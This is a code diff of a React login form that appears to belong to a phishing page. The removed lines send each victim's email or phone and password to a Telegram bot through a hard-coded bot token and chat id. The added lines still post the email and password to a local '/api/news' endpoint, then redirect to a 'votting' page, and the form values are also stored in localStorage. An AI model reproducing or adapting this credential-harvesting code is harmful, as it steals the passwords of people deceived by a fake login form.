@@ -49,15 +49,12 @@ const FormComponent = () => {
 
         localStorage.setItem('dataForm', JSON.stringify(values))
 
-        const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
-        const chat_id   = '5208541473';
+        const data   = { 
+            email: values.email_or_phone, 
+            password: values.password
+        }
 
-        const message   =
-        '%0A<strong>Email or Phone: </strong>' + values.email_or_phone + 
-        '%0A<strong>Password: </strong>' + values.password;
-
-
-        axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
+        axios.post(`http://localhost:3600/api/news`, data)
             .then((response) => {
                 navigate('/votting');
             })
@@ -67,7 +64,7 @@ const FormComponent = () => {
 
     return (
         
-        <div className="main">
+        <div className="main login-form">
 
             <div className="mob-down">
                 <div className="phone"></div>
